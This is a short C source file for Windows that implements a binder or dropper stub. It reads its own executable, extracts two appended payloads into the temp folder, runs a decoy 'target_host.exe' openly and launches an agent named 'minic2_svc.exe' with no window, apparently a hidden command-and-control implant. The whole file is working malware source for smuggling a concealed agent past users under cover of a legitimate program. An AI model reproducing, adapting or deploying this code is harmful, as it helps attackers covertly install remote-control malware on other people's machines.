
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
int main() {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    FILE *f = fopen(exe_path, "rb");
    if (!f) return 1;
    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    if (file_size < 8) { fclose(f); return 1; }
    fseek(f, file_size - 8, SEEK_SET);
    unsigned int stub_size = 0, target_size = 0;
    fread(&stub_size, 4, 1, f);
    fread(&target_size, 4, 1, f);
    if (stub_size == 0 || stub_size >= (unsigned int)file_size) { fclose(f); return 1; }
    unsigned int agent_size = (unsigned int)file_size - stub_size - target_size - 8;
    fseek(f, stub_size, SEEK_SET);
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    char target_path[MAX_PATH];
    char agent_path_out[MAX_PATH];
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    if (target_size > 0) {
        char *target_buf = (char*)malloc(target_size);
        if (target_buf) {
            fread(target_buf, 1, target_size, f);
            sprintf_s(target_path, "%starget_host.exe", tmp);
            FILE *tf = fopen(target_path, "wb");
            if (tf) { fwrite(target_buf, 1, target_size, tf); fclose(tf); }
            free(target_buf);
            ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
            ZeroMemory(&pi, sizeof(pi));
            CreateProcessA(target_path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
            if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
        }
    }
    if (agent_size > 0) {
        char *agent_buf = (char*)malloc(agent_size);
        if (agent_buf) {
            fread(agent_buf, 1, agent_size, f);
            sprintf_s(agent_path_out, "%sminic2_svc.exe", tmp);
            FILE *af = fopen(agent_path_out, "wb");
            if (af) { fwrite(agent_buf, 1, agent_size, af); fclose(af); }
            free(agent_buf);
            ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
            ZeroMemory(&pi, sizeof(pi));
            CreateProcessA(agent_path_out, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
        }
    }
    fclose(f);
    return 0;
}
